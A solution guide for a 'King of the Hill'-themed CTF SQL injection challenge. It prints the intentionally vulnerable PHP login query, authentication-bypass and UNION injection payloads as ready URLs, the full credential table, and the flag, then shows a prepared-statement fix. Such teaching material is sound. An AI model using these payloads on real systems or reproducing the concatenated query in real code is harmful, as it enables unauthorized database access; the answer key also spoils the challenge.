# King of the Hill SQL Injection Challenge - Solution Guide

## Challenge Overview

This is a SQL injection challenge themed around the TV show "King of the Hill." Players must exploit a vulnerable login form to access the employee database and retrieve the flag.

## Vulnerability Location

The vulnerability is in `login.php` at lines 200-205:

```php
$username = $_GET['username'];
$password = $_GET['password'];

// Vulnerable SQL query (intentionally for CTF)
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

The application directly concatenates user input into the SQL query without any sanitization or parameterization.

## Solution Methods

### Method 1: Authentication Bypass (Easiest)

**Payload:** `' OR 1=1 --`

**URL:** `http://localhost:8080/login.php?username='+OR+1=1+--&password=anything`

**Explanation:** This payload closes the username field with a single quote, then uses `OR 1=1` to make the condition always true, and `--` comments out the rest of the query.

### Method 2: Using Character Names

Players can try logging in as any of the King of the Hill characters:

- `username=hank&password=propane123`
- `username=dale&password=conspiracy`
- `username=bill&password=army_strong`
- etc.

### Method 3: Union-Based Injection

**Payload:** `' UNION SELECT 1,2,3 --`

**URL:** `http://localhost:8080/login.php?username='+UNION+SELECT+1,2,3+--&password=anything`

This would show the database structure and allow for further enumeration.

## Expected Results

When successful, players should see:

1. **Flag Banner:** `🎉 FLAG{propane_accessories_are_the_best} 🎉`
2. **Employee Records:** All database entries displayed in a table
3. **Statistics:** Number of employees found, database fields, location

## Database Contents

The database contains these King of the Hill character records:

| ID | Username | Password |
|----|----------|----------|
| 1 | hank | propane123 |
| 2 | dale | conspiracy |
| 3 | bill | army_strong |
| 4 | boomhauer | fast_talker |
| 5 | bobby | thats_my_purse |
| 6 | peggy | substitute_teacher |
| 7 | luanne | beauty_school |
| 8 | cotton | killed_fiddy_men |
| 9 | kahn | laotian_pride |
| 10 | admin | FLAG{propane_accessories_are_the_best} |

## Learning Points

1. **Input Validation:** The application fails to validate or sanitize user input
2. **SQL Injection:** Direct concatenation of user input into SQL queries is dangerous
3. **Authentication Bypass:** SQL injection can bypass authentication mechanisms
4. **Database Enumeration:** Attackers can extract sensitive data from databases
5. **Defense:** Use parameterized queries or prepared statements

## Prevention

To fix this vulnerability, the code should use parameterized queries:

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bindValue(1, $username, SQLITE3_TEXT);
$stmt->bindValue(2, $password, SQLITE3_TEXT);
$result = $stmt->execute();
```

## Difficulty Level

- **Beginner to Intermediate**
- **Estimated Time:** 10-30 minutes
- **Prerequisites:** Basic understanding of SQL and web applications

## CTF Integration

This challenge is perfect for:
- Web security tracks
- SQL injection introduction
- Themed CTF events
- Educational workshops

The King of the Hill theme makes it engaging while teaching important security concepts. 